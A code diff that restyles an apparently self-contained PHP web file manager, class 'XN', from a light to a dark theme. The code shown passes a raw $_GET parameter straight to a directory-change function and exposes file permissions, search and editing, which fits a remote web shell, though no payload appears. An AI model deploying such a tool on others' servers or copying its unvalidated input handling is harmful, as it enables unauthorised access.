@@ -69,7 +69,7 @@ class XN
         {
             switch ($type)
             {
-                case 1:print "<font color='#000'>{$perms}</font>";break;
+                case 1:print "<font color='#e3e3e3'>{$perms}</font>";break;
                 case 2:print "<font color='green'>{$perms}</font>";break;
             }
         }
@@ -362,7 +362,7 @@ class XN
 }
 }
 if (isset($_GET['x'])){XN::cd($_GET['x']);}
-function search(){?><input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name"><?php }
+function search(){?><input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..."><?php }
 function head($x, $y, $class = null)
 {
     ?>
@@ -410,8 +410,8 @@ function alert($message)
 <style type="text/css">
     @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
     body {
-        background: #e2e1e0;
-        color: #292929;
+        background: #010101;
+        color: #e3e3e3;
         overflow: hidden;
         margin: 0;
         margin-top: 10px;
@@ -421,7 +421,6 @@ function alert($message)
     }
     .count {
         font-size:10px;
-
         z-index: 99999;
         text-align: center;
         padding:10px;
@@ -459,16 +458,17 @@ function alert($message)
         padding-bottom:10px;
     }
     .storage {
+    	background: #232931;
         margin-top:7px;
-        box-shadow: 0px 2px 2px 0px #e0e0e0;
+        box-shadow: 0px 2px 2px 0px #393e46;
         padding:25px;
         padding-bottom:10px;
     }
     .storage span {
-        color: #666;
+        color: #929aab;
     }
     .storage span.title {
-        color: #000;
+        color: #e3e3e3;
         font-size: 23px;
         font-weight:bold;
     }
@@ -505,8 +505,9 @@ function alert($message)
         margin-right:20px;
         width:100%;
         border-radius: 5px;
-        border: 1px solid #ebebeb;
-        background: #ebebeb;
+        border:1px solid #393e46;
+        color: #e3e3e3;
+        background: #393e46;
         outline: none;
     }
     .hidden {
@@ -535,8 +536,8 @@ function alert($message)
         text-overflow: ellipsis;
     }
     .back a {
-        background: #fff;
-        color: #000;
+        background: #232931;
+        color: #e3e3e3;
         font-weight: bold;
         border-radius:10px;
         padding: 5px;
@@ -549,7 +550,7 @@ function alert($message)
         text-align: left;
         border-radius:10px;
         max-height:98.5%;
-        background: #fff;
+        background: #232931;
         width:50%;
     }
     .table {
@@ -665,10 +666,10 @@ function alert($message)
     .edit button {
         border-radius: 5px;
         font-size: 15px;
-        background: #e7f3ff;
+        background: #393e46;
         font-weight: bold;
-        border: 1px solid #e7f3ff;
-        color: #1889f5;
+        border: 1px solid #393e46;
+        color: #e3e3e3;
         outline: none;
         padding: 5px;
         padding-left:10px;
@@ -698,9 +699,10 @@ function alert($message)
     textarea {
         width: 100%;
         height:270px;
+        color: #e3e3e3;
         border-radius: 10px;
-        border: 1px solid #ebebeb;
-        background: #ebebeb;
+        border: 1px solid #393e46;
+        background: #393e46;
         outline: none;
         padding:20px;
         resize: none;
@@ -810,7 +812,7 @@ function alert($message)
     .block .date {
         margin-top: 4px;
         font-size: 70%;
-        color: #666;
+        color: #929aab;
     }
     .block .date .dir-size,
     .block .date .file-size {
@@ -835,7 +837,7 @@ function alert($message)
     .block a {
         border-radius:5px;
         display: block;
-        color: #292929;
+        color: #e3e3e3;
         padding-top: 8px;
         padding-bottom: 13px;
         padding-left:5px;
@@ -845,7 +847,7 @@ function alert($message)
         text-decoration: none;
     }
     a {
-        color: #000;
+        color: #e3e3e3;
         text-decoration: none;
     }
     nav {
@@ -853,8 +855,8 @@ function alert($message)
         position: relative;
     }
     .dropdown-toggle {
-        border: 1px solid #ebebeb;
-        background: #ebebeb;
+        border: 1px solid #393e46;
+        background: #393e46;
         outline: none;
         padding: .5em 1em;
         border-radius: .3em;
@@ -862,12 +864,13 @@ function alert($message)
     }
     .dropdown-toggle:hover {
         cursor: pointer;
-        background: #d6d6d6;
+        background: #283149;
     }
     .toggle {
         padding:10px;
         border: 1px solid #ebebeb;
         background: #ebebeb;
+        color: #e3e3e3;
         margin-bottom: 3px;
     }
     ul.dropdown {
@@ -875,7 +878,7 @@ function alert($message)
         position:absolute;
         z-index: 5;
         margin-top: .5em;
-        background: #fff;
+        background: #393e46;
         box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
         margin-left:-190px;
         margin-top: -24px;
@@ -889,7 +892,7 @@ function alert($message)
     ul.dropdown li button {
         text-align: left;
         outline: none;
-        color: #000;
+        color: #e3e3e3;
         width: 100%;
         font-size:18px;
         background: none;
@@ -904,7 +907,7 @@ function alert($message)
     ul.dropdown li a {
         text-align: left;
         outline: none;
-        color: #000;
+        color: #e3e3e3;
         border-radius:7px 7px 0px 0px;
         width: 81%;
         font-size:18px;
@@ -1064,7 +1067,7 @@ function alert($message)
         z-index: 2;
         max-width:500px;
         box-sizing: border-box;
-        background: #fff;
+        background: #5c636e;
         -webkit-border-radius: 7px;
         -moz-border-radius: 7px;
         -o-border-radius: 7px;
@@ -1107,7 +1110,7 @@ function alert($message)
         min-width:350px;
         max-width:500px;
         box-sizing: border-box;
-        background: #fff;
+        background: #393e46;
         -webkit-border-radius: 7px;
         -moz-border-radius: 7px;
         -o-border-radius: 7px;
